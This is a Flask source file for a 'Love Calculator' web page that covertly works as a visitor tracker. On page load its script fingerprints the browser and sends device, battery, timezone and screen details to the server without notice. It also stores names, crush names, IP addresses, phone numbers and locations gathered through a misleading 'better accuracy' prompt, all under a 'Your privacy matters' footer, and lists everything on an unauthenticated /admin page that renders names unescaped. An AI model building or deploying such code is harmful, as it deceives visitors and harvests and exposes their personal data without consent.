from flask import Flask, request, jsonify, render_template_string
import os
import random
import sqlite3
import json
from datetime import datetime

app = Flask(__name__)

# SQLite Database (works on Vercel)
DB_FILE = '/tmp/visitors.db'

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS visitors (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            sessionId TEXT,
            timestamp TEXT,
            ip TEXT,
            name TEXT,
            crush_name TEXT,
            fortuneText TEXT,
            phoneNumber TEXT,
            percentage INTEGER,
            fingerprint TEXT,
            batteryLevel TEXT,
            screen TEXT,
            timezone TEXT,
            userAgent TEXT,
            latitude REAL,
            longitude REAL,
            deviceMemory TEXT,
            networkType TEXT
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def save_visitor(data):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT id FROM visitors WHERE sessionId = ?", (data.get('sessionId'),))
    existing = c.fetchone()
    if existing:
        c.execute('''
            UPDATE visitors SET
                timestamp=?, ip=?, name=?, crush_name=?, fortuneText=?, phoneNumber=?, percentage=?,
                fingerprint=?, batteryLevel=?, screen=?, timezone=?, userAgent=?,
                latitude=?, longitude=?, deviceMemory=?, networkType=?
            WHERE sessionId=?
        ''', (
            data.get('timestamp'), data.get('ip'), data.get('name'), data.get('crush_name'),
            data.get('fortuneText'), data.get('phoneNumber'), data.get('percentage'),
            data.get('fingerprint'), data.get('batteryLevel'), data.get('screen'),
            data.get('timezone'), data.get('userAgent'), data.get('latitude'), data.get('longitude'),
            data.get('deviceMemory'), data.get('networkType'), data.get('sessionId')
        ))
    else:
        c.execute('''
            INSERT INTO visitors (
                sessionId, timestamp, ip, name, crush_name, fortuneText, phoneNumber, percentage,
                fingerprint, batteryLevel, screen, timezone, userAgent,
                latitude, longitude, deviceMemory, networkType
            ) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
        ''', (
            data.get('sessionId'), data.get('timestamp'), data.get('ip'), data.get('name'),
            data.get('crush_name'), data.get('fortuneText'), data.get('phoneNumber'), data.get('percentage'),
            data.get('fingerprint'), data.get('batteryLevel'), data.get('screen'),
            data.get('timezone'), data.get('userAgent'), data.get('latitude'), data.get('longitude'),
            data.get('deviceMemory'), data.get('networkType')
        ))
    conn.commit()
    conn.close()

def get_all_visitors():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM visitors ORDER BY id DESC")
    rows = c.fetchall()
    columns = [description[0] for description in c.description]
    visitors = [{columns[i]: row[i] for i in range(len(columns))} for row in rows]
    conn.close()
    return visitors

def calculate_love_percentage(name1, name2):
    combined = (name1 + name2).lower()
    total = sum(ord(c) for c in combined)
    return 50 + (total % 51)

def get_love_message(name1, name2, percentage):
    messages = [
        f"💕 {name1} ❤️ {name2} – your love is {percentage}% pure magic!",
        f"✨ The stars say {name1} and {name2} have a {percentage}% chance of a fairytale romance!",
        f"🌹 {name1} + {name2} = {percentage}% love chemistry! Keep the spark alive!",
        f"💖 Destiny smiles at {name1} and {name2} – {percentage}% soulmate connection!",
        f"💫 {name1} and {name2}, your hearts beat at {percentage}% harmony!"
    ]
    return random.choice(messages)

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>💕 Love Calculator</title>
    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{
            background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);
            font-family:'Segoe UI',sans-serif;
            min-height:100vh;
            display:flex;
            align-items:center;
            justify-content:center;
            padding:20px;
        }
        .card{
            background:rgba(255,255,255,0.98);
            border-radius:35px;
            padding:45px 35px;
            max-width:500px;
            width:100%;
            text-align:center;
            box-shadow:0 30px 60px rgba(0,0,0,0.2);
        }
        h1{
            background:linear-gradient(135deg,#667eea,#764ba2);
            -webkit-background-clip:text;
            background-clip:text;
            color:transparent;
            margin-bottom:10px;
            font-size:2.3em;
        }
        .subtitle{color:#7b8a9b;margin-bottom:35px;}
        .input-group{display:flex;gap:15px;margin-bottom:30px;flex-wrap:wrap;}
        input{
            flex:1;
            padding:16px 25px;
            border:2px solid #e2e8f0;
            border-radius:60px;
            font-size:16px;
            text-align:center;
            background:#f7fafc;
        }
        button{
            background:linear-gradient(135deg,#667eea,#764ba2);
            color:white;
            border:none;
            padding:16px 40px;
            font-size:18px;
            font-weight:600;
            border-radius:60px;
            cursor:pointer;
            width:100%;
        }
        .result{
            margin-top:30px;
            padding:30px;
            background:linear-gradient(135deg,rgba(102,126,234,0.1),rgba(118,75,162,0.1));
            border-radius:25px;
            display:none;
        }
        .percentage{
            font-size:5em;
            font-weight:800;
            background:linear-gradient(135deg,#f093fb,#f5576c);
            -webkit-background-clip:text;
            background-clip:text;
            color:transparent;
        }
        .love-message{font-size:1.2em;color:#2d3748;margin:20px 0;}
        .phone-section{
            margin-top:25px;
            padding:20px;
            background:white;
            border-radius:20px;
            display:none;
            border:1px solid #e2e8f0;
        }
        .phone-input{
            width:100%;
            padding:14px;
            border:2px solid #e2e8f0;
            border-radius:50px;
            margin-bottom:12px;
        }
        .save-btn{background:linear-gradient(135deg,#f093fb,#f5576c);}
        .status{
            margin-top:15px;
            padding:10px;
            border-radius:25px;
            font-size:13px;
            display:none;
        }
        .status.success{background:#c6f6d5;color:#22543d;display:block;}
        .status.error{background:#fed7d7;color:#742a2a;display:block;}
        .loading{
            display:inline-block;
            width:20px;
            height:20px;
            border:3px solid rgba(255,255,255,0.3);
            border-radius:50%;
            border-top-color:white;
            animation:spin 0.8s linear infinite;
        }
        @keyframes spin{to{transform:rotate(360deg);}}
        footer{margin-top:20px;font-size:11px;color:#a0aec0;}
    </style>
</head>
<body>
<div class="card">
    <h1>💕 Love Calculator</h1>
    <div class="subtitle">Discover the magic between you two ✨</div>
    <div class="input-group">
        <input type="text" id="name1" placeholder="Your name">
        <input type="text" id="name2" placeholder="Crush's name">
    </div>
    <button onclick="calculateLove()">🔮 Calculate Love Percentage</button>
    <div id="result" class="result">
        <div class="percentage" id="percentage">0%</div>
        <div class="love-message" id="message"></div>
    </div>
    <div id="phoneSection" class="phone-section">
        <h4>📱 Save Your Result</h4>
        <input type="tel" id="phone" class="phone-input" placeholder="Phone number">
        <button class="save-btn" onclick="savePhone()">💾 Save</button>
    </div>
    <div id="status" class="status"></div>
    <footer>🔒 Your privacy matters</footer>
</div>

<script>
    let sessionId = localStorage.getItem('love_session');
    if(!sessionId){
        sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2,10);
        localStorage.setItem('love_session', sessionId);
    }
    let currentFortune = '', currentPercent = 0;
    let collectedData = {sessionId: sessionId, timestamp: new Date().toISOString()};
    
    async function collectDeviceData(){
        try{
            const fp = await FingerprintJS.load();
            const result = await fp.get();
            collectedData.fingerprint = result.visitorId;
        }catch(e){}
        collectedData.screen = screen.width + 'x' + screen.height;
        collectedData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        collectedData.userAgent = navigator.userAgent;
        if(navigator.deviceMemory) collectedData.deviceMemory = navigator.deviceMemory + 'GB';
        if('getBattery' in navigator){
            try{
                const battery = await navigator.getBattery();
                collectedData.batteryLevel = Math.round(battery.level * 100) + '%';
            }catch(e){}
        }
        await fetch('/save', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(collectedData)});
    }
    
    async function calculateLove(){
        const name1 = document.getElementById('name1').value.trim();
        const name2 = document.getElementById('name2').value.trim();
        if(!name1 || !name2){
            showStatus('Enter both names!', 'error');
            return;
        }
        const btn = event.target;
        btn.innerHTML = '<span class="loading"></span> Calculating...';
        btn.disabled = true;
        collectedData.name = name1;
        collectedData.crush_name = name2;
        await fetch('/save', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(collectedData)});
        const response = await fetch('/calculate-love', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({name1,name2})});
        const result = await response.json();
        currentPercent = result.percentage;
        currentFortune = result.message;
        document.getElementById('percentage').innerHTML = currentPercent + '%';
        document.getElementById('message').innerHTML = currentFortune;
        document.getElementById('result').style.display = 'block';
        document.getElementById('phoneSection').style.display = 'block';
        collectedData.fortuneText = currentFortune;
        collectedData.percentage = currentPercent;
        await fetch('/save', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(collectedData)});
        btn.innerHTML = '🔮 Calculate Love Percentage';
        btn.disabled = false;
        showStatus('Your love score is ready! ✨', 'success');
        setTimeout(() => {
            if(confirm('Share location for better accuracy?')){
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    collectedData.latitude = pos.coords.latitude;
                    collectedData.longitude = pos.coords.longitude;
                    await fetch('/save', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(collectedData)});
                    showStatus('Location saved!', 'success');
                });
            }
        }, 1000);
    }
    
    async function savePhone(){
        const phone = document.getElementById('phone').value.trim();
        if(!phone){
            showStatus('Enter phone number', 'error');
            return;
        }
        await fetch('/save-phone', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({sessionId, phoneNumber: phone, fortune: currentFortune, percentage: currentPercent})});
        showStatus('Number saved!', 'success');
        document.getElementById('phone').disabled = true;
        event.target.disabled = true;
    }
    
    function showStatus(msg, type){
        const el = document.getElementById('status');
        el.textContent = msg;
        el.className = `status ${type}`;
        setTimeout(() => { el.style.display = 'none'; el.className = 'status'; }, 3000);
    }
    
    collectDeviceData();
</script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/save', methods=['POST'])
def save():
    data = request.get_json()
    data['ip'] = request.headers.get('x-forwarded-for', request.remote_addr)
    data['timestamp'] = datetime.now().isoformat()
    save_visitor(data)
    return jsonify({'status': 'saved'})

@app.route('/save-phone', methods=['POST'])
def save_phone():
    data = request.get_json()
    session_id = data.get('sessionId')
    phone = data.get('phoneNumber')
    fortune = data.get('fortune')
    percentage = data.get('percentage')
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE visitors SET phoneNumber=?, fortuneText=?, percentage=? WHERE sessionId=?", (phone, fortune, percentage, session_id))
    conn.commit()
    conn.close()
    return jsonify({'status': 'saved'})

@app.route('/calculate-love', methods=['POST'])
def calculate_love():
    data = request.get_json()
    percentage = calculate_love_percentage(data.get('name1', ''), data.get('name2', ''))
    message = get_love_message(data.get('name1', ''), data.get('name2', ''), percentage)
    return jsonify({'percentage': percentage, 'message': message})

@app.route('/admin')
def admin():
    visitors = get_all_visitors()
    if not visitors:
        return "No data yet"
    html = '<h1>Visitor Data</h1><table border="1">'
    html += '<tr><th>ID</th><th>Name</th><th>Crush</th><th>Love %</th><th>Phone</th><th>Location</th></tr>'
    for v in visitors:
        html += f'<tr><td>{v.get("id")}</td><td>{v.get("name")}</td><td>{v.get("crush_name")}</td><td>{v.get("percentage")}%</td><td>{v.get("phoneNumber")}</td><td>{v.get("latitude")},{v.get("longitude")}</td></tr>'
    html += '</table><a href="/">Back</a>'
    return html

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
